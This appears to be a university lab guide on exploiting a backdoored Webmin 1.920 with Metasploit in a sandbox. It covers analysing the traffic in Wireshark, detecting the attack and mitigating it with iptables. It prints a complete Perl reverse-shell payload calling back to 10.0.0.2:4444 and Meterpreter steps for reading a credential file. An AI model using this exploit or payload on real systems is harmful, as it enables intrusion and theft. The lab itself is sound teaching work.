# PB177 – Initial access, execution

[[_TOC_]]

## Learning objectives

At the end of this lab session, you will be able to:
- use Metasploit for initial access and execution using one particular vulnerability,
- use Wireshark for analyzing packets generated by Metasploit,
- detect the particular exploit and mitigate the vulnerability.

<details open>
<summary>What is an initial access?</summary> 

Techniques that use various entry vectors to gain their initial foothold within a network.\
See [MITRE ATT&CK® Matrix for Enterprise](https://attack.mitre.org/tactics/TA0001/) for more info.

</details>

<details open>
<summary>What is an execution?</summary> 

Techniques that result in adversary-controlled code running on a local or remote system.\
See [MITRE ATT&CK® Matrix for Enterprise](https://attack.mitre.org/tactics/TA0002/) for more info.

</details>

## Start the sandbox

1. Update the repo by running `git pull` in `labs` directory. Go to `2` directory.
1. Login to get access to Podman images: `podman login gitlab.fi.muni.cz:5050`.
1. **Run `podman-compose pull` to download images used in this lab.**
1. Run `podman-compose up -d`.
1. [Check you can access Kali container using terminal and RDP](../1/index.md#start-the-sandbox). This lab uses 3 containers, `podman-compose ps -q | wc -l` should display `3`.

## Metasploit

[Metasploit](https://www.metasploit.com) claims to be the world’s most used penetration testing framework. We will use its open-source flavor named [Metasploit Framework](https://github.com/rapid7/metasploit-framework) ([documentation](https://docs.metasploit.com)).

### Task: Exploit Public-Facing Application

[T1190](https://attack.mitre.org/techniques/T1190/) and [T1059](https://attack.mitre.org/techniques/T1059/).

Based on your previous reconnaissance, you have identified that 10.0.33.80 is a valuable target.\
Use `nmap` at `attacker` to find out more information about the service running at this IP.\
Search the  Metasploit exploit database for an exploit applicable to the service running at the IP.

Hints
  * Start Metasploit in a console or terminal by executing `msfconsole`.
  * Use Metasploit commands for searching rather than a web search engine or AI assistant. 
  * Get Metasploit built-in help by typing `?` or `help`.
  * Use the Up arrow key <kbd>↑</kbd> in `msfconsole` to browse your command history.

<details open>

<summary>
Solution
</summary>

* `nmap -sV 10.0.33.80` shows version `MiniServ 1.920 (Webmin httpd)`.
* `search miniserv` in Metasploit does not yield any results.
* `search webmin` yields 12 results.
* `search webmin 1.920` yields one module `exploit/linux/http/webmin_backdoor` with two so-called *targets*.
* `info 0` (or `1` or `2`) shows a description stating "This module exploits a backdoor in Webmin versions 1.890 through 1.920." and "Only version 1.890 is exploitable in the default install. Later affected versions require the expired password changing feature to be enabled."

</details>
<br/>
Now use the module and run another Metasploit command to check whether the target is exploitable. Do not run the exploit yet.

<details open>
<summary>
Solution
</summary>

```
use 0
set RHOST 10.0.33.80
check
```

* Set required variables: `RHOST` for the target IP.
* `check` returns `[+] 10.0.33.80:10000 - The target is vulnerable.`.

</details>
<br/>

Run the exploit with the `Unix In-Memory` target. What does it do?

<details open>
<summary>
Solution and follow-up task
</summary>

```
set LHOST 10.0.0.2 
run
...
[*] Command shell session 1 opened (10.0.0.2:4444 -> 10.0.33.80:59296) at 2024-09-20 12:35:48 +0000
```
* We need to set a listener host to which our payload can reach back to: `LHOST` must be the address of our `eth0` interface. Alternatively, you can use `set LHOST eth0`.
* Exploit results in **Remote Code Execution** (RCE), see the References section for information about the module (shown by `info` command).
* The exploit sends a **payload**, a code that starts a **reverse shell** in this case. The **reverse** means the target initiates a connection to the attacker's machine. Do you know why the reverse shell is better than initiating a connection from the attacker to the target?
* Once the session is opened, run `hostname` to check the shell is running at the target.
* Note: using a shell executed by the exploit is a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/) technique from the [Execution](https://attack.mitre.org/tactics/TA0002/) tactic.
* Use <kbd>Control</kbd> + <kbd>C</kbd> to exit the session, or type `background` to put it into the background, so that you can return to it.

</details>
<br/>

Let the Metasploit console open. You will run the exploit again during next task.

## Wireshark

[Wireshark](https://www.wireshark.org) claims to be the world's most popular network protocol analyzer ([User's Guide](https://www.wireshark.org/docs/wsug_html_chunked/)). Wireshark is installed at Kali. To capture live traffic, we need to enable this feature for non-root users.

### Prerequisite: Enable packet capture for non-root users (kali) and start Wireshark

* Open Terminal in Kali GUI (use RDP to connect to Kali, log in as `kali`).
* Run `sudo dpkg-reconfigure wireshark-common` and answer `<Yes>` to it.
* Add the execute permission for `dumpcap`: `sudo chmod +x /usr/bin/dumpcap`
* Start Wireshark **from the terminal** in a GUI: `wireshark`. 

* Notes: 
  * Do not start Wireshark from Kali GUI menu. 
  * Do not start Wireshark with `sudo` in the terminal.
  * Running `dpkg-reconfigure` and adding `x` permission is required only for the first time.

### Task: Capture traffic of an exploit

* Wireshark shows all interfaces ready for capture after it starts.
* Double click `eth0` interface to start the capture. Alternatively, click on the first icon below File menu (a blue fin).
* Go back to the Metasploit console.
* Run the exploit again and execute the `hostname` command (see the previous Solution and follow-up task).
* Stop the packet capture by the second button below the Edit menu (red stop button).

### Task: Search for traffic with exploit

Search for the first packet carrying an exploit. What **application** protocol is used?\
Search for the shell session and command you have typed.

<details open>
<summary>
Solution and follow-up tasks
</summary>

* Webmin is a web application, even though it is **not** running at the default port 80 or 443 but 10000.
* The exploit uses HTTP traffic from `attacker` to the target. The first option is [applying a display filter](https://www.wireshark.org/docs/wsug_html_chunked/ChWorkDisplayFilterSection.html) of `http` to see only HTTP traffic. You should see 6 packets in total. Another option is to filter traffic from and to TCP port 10000 (`tcp.port==10000`).
* Then you can right click on the first packet and use **Follow TCP Stream** or **Follow HTTP Stream** (both in **Follow**, [documentation](https://www.wireshark.org/docs/wsug_html_chunked/ChAdvFollowStreamSection.html)) to see the conversation between `attacker` and the target service. You should see a simple HTTP request for the root of the web (`GET / HTTP/1.1`) and answer, HTML with `<form>` element. You can use <kbd>Control</kbd> + <kbd>F</kbd> for searching in the content of the conversation. You can also save the reply and view the HTML in your browser: Switch from *Entire conversation* to server packets only at the bottom of the window and click *Save as* button. Open the file in your browser (use shell `open file.html` command).
* Conclusion: The first conversation looks like legitimate traffic, not an exploit.
* Close the stream window and clear the filter by deleting it or clicking `X` on the right of the filter input field. Note the display filter has changed to `tcp.stream eq 0` after using the Follow feature.

* Set again the `http` display filter by typing it or invoking from a history by clicking on the small down arrow <kbd>↓</kbd> on the right of the filter input field (useful for long filters).
* Use **Follow TCP/HTTP Stream** again at **the third** packet (the first two formed the first conversation). It is an HTTP POST request on `/password_change.cgi` with the content body starting with `expired=echo`. Save the server reply to HTML and view it in a browser. What did the server reply?
* Conclusion: the second conversation looks like a check or a preparation for exploitation, not an actual exploit. The plugin [source code](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/webmin_backdoor.rb) confirms this observation.

* Inspect the last conversation starting with the **fifth packet**. Again, `POST /password_change.cgi` is sent but with **different request body**. The body contains the variable `expired` again but a different value starting with `perl`.
* To see the content of the variable, select the packet with the POST request in the Packet List pane and expand `HTML Form URL Encoded: application/x-www-form-urlencoded` tree in the Packet Details pane. There you can see keys and values, in particular `expired` and `perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.0.0.2:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'`. The value contains the reverse shell (see `[*] Sending cmd/unix/reverse_perl command payload` in your Metasploit console and [source code of the shell](https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/reverse_perl.rb)).
* Conclusion: the third conversation contains traffic exploiting the vulnerability and starting the reverse shell session.

* The reverse shell session is initiated **from the target to the `attacker`** at port 4444 (see the exploit source code and/or output in the Metasploit console).
* Filtering TCP port 4444 shows a few packets. *Follow TCP Stream* shows not only your command and server reply but also `echo` command. Who/what did execute this command and why?

</details>

## Task: Detection and mitigation of the exploit

How can this particular exploit be detected and mitigated?

Check detections for [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) and [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/) and suggest one detection using network traffic and another detection using application logs.

<details open>
<summary>
Solution and follow-up task -- network traffic
</summary>

* One option is to monitor and report HTTP POST requests to `password_change.cgi`, which should not be frequent.
* Another option is to search for a code of the reverse shell or its parts (such as `perl`, `fork`, `new IO::Socket::INET` or `system`) in general , or only in HTTP POST requests to `password_change.cgi`.
* What are the pros and cons of these two methods?
* Do you have another idea? Share it with the instructor.

</details>

<details open>
<summary>
Solution and follow-up task -- application logs
</summary>

* According to [Webmin documentation](https://webmin.com/docs/modules/webmin-actions-log/), when the logging is enabled, the logs are stored in `/var/webmin/miniserv.log`.
* Similarly to network detection, access to `password_change.cgi` might be suspicious.
* Can you write a BASH one-liner to detect such accesses? Connect to the target using `podman-compose exec server bash` and test it at the target. 
<details open>
<summary>
Solution: BASH one-liner
</summary>

`grep 'POST /password_change.cgi' /var/webmin/miniserv.log`
</details>
</details>

What do you think is the simplest [mitigation](https://attack.mitre.org/techniques/T1190/) for implementation?

<details open>
<summary>
Solution and follow-up tasks
</summary>

We consider **Network Segmentation** followed by **Update Software** the simplest for implementation. 

**Network Segmentation**

Network segmentation can be done by allowing access to the Webmin service only from the internal network, i. e. 10.0.33.0/24 in our case. Attacker with IP 10.0.0.2 will not access the target then.

Set up [iptables](https://www.netfilter.org/projects/iptables/index.html) at the target to restrict access to the Webmin service from outside.

<details open>
<summary>
Solution and follow-up tasks
</summary>

* The most suitable option is to **reject** or **drop** traffic going to TCP port 10000 coming from outside 10.0.33.0/24 but still allowing access from inside, i. e.: `iptables -A INPUT -p TCP --dport 10000 ! --source 10.0.33.0/24 -j REJECT`.
  * `-A` adds a rule being applied to incoming packets,
  * `-p` specifies the protocol, 
  * `--dport` the destination port, the port where Webmin is running,
  * `!` is a `NOT` operator for the following parameter,
  * `--source` specifies the source network, together with the preceding `!` says "NOT 10.0.33.0/24",
  * `-j` says what to do if the packet matches the rule.
</details>
<br/>

Now test if the mitigation works as expected. Access the server from `attacker` and `server2`.

<details open>
<summary>
Solution and follow-up tasks
</summary>

* Check the `attacker` **cannot** access the Webmin at the target, either using a web browser at Kali, or using `curl` in CLI.
* Check the other hosts in the same network (10.0.33.0/24) **can** access the Webmin at the target. Connect to `server2` using `podman-compose exec server2 bash` and run `curl http://10.0.33.80:10000`.

</details>
<br/>

Finally, examine differences between two iptables rules in network traffic using Wireshark. See solution of the first task in Network segmentation if you are not sure which two rules we mean.

<details open>
<summary>
Solution and follow-up tasks
</summary>

* Open Wireshark at `attacker` in GUI and start traffic capture. Run the check from `attacker` again and see the response from the target. How does `iptables` tell `attacker` the traffic is rejected?
* Delete the rule (`man` pages are not installed at the target, use their [online version](https://linux.die.net/man/8/iptables)). Check the iptables are empty.
* Add a new rule, which differs only in an action specified by `-j`: `iptables -A INPUT -p TCP --dport 10000 ! --source 10.0.33.0/24 -j DROP`
* Run the check from `attacker` again. What are the differences? Check the `curl` output and packet capture in Wireshark.
* What action would you prefer to be set as an attacker and what as the defender?

</details>
<br/>

**Update Software**

Since the vulnerability (backdoor) is present only in Webmin versions 1.890 through 1.920, there is [a newer version fixing it](https://webmin.com/archives/). 

However, software updates, in general, may require configuration changes or may affect other features when the newer version is not backward-compatible, so it must be done after studying the software changelog or documentation.

</details>

## Task: Use Meterpreter for execution

[T1059](https://attack.mitre.org/techniques/T1059/)

The exploit can have two targets: `Unix In-Memory` and `Linux Dropper`, see output of the `search` or `info` command. Use `Linux Dropper` and run the exploit again. What do you get after the successful exploitation?

> Hint: Remove the iptables rule to be able to run the exploit from attacker.

<details open>
<summary>
Solution and follow-up tasks
</summary>

```
info exploit/linux/http/webmin_backdoor
set TARGET 1
run

[*] Started reverse TCP handler on 10.0.0.2:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Linux Dropper) target
[*] Sending linux/x64/meterpreter/reverse_tcp command stager
[*] Sending stage (3045380 bytes) to 10.0.33.80
[*] Meterpreter session 1 opened (10.0.0.2:4444 -> 10.0.33.80:51814) at 2024-09-27 08:58:43 +0000
[*] Command Stager progress - 100.00% done (823/823 bytes)

meterpreter >
```

* The second available target runs [Meterpreter](https://www.offsec.com/metasploit-unleashed/about-meterpreter/) instead of a simple reverse shell. Meterpreter features command history, tab completion, channels, file uploads and downloads, and more.
* Type `help` to list available commands.
* Print information about the remote system, namely its operating system.
* Print the working directory and list files at the target machine.
* Print out the content of `miniserv.users` in `/etc/webmin`.
* Download the file to your local machine.
* Start a shell at the remote system, type a few commands, and use arrow keys to browse your command history.
* Exit the shell to Meterpreter.
* Close the Meterpreter session.
* Exit the Metasploit console.

> Note: You can also upgrade your `in-memory` perl reverse shell to a Meterpreter shell. Background the opened shell by typing `background`. List your sessions with the `sessions` command and note the **session id** attribute. Then use `sessions -u <id>` to upgrade (opens a new Meterpreter session).


</details>


## End of the lab

If you finish all tasks, stop the sandbox using `podman-compose down`.
